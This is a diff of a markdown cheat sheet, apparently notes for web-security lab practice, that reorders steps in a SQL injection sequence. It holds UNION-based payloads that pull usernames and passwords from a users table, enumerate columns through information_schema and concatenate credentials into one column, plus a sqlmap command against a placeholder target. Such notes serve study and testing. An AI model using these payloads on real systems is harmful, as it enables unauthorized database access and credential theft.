@@ -1308,16 +1308,16 @@ sqlmap -v -u 'https://TARGET.net/filter?category=*' -p 'category' --batch --flus
 '+UNION+SELECT+username,+password+FROM+users--
 ```  
 
->Retrieving multiple values in a single column able to reflect text.  
-
-```
-'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
-```  
-
 >Retrieve the names of the **columns** in the ***users*** table.  
 
 ```SQL
 '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_XXXX'--
+```  
+  
+>Retrieving multiple values in a single column able to reflect text.  
+
+```
+'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 ```  
 
 >Final step **dump data** from the username and passwords columns.  
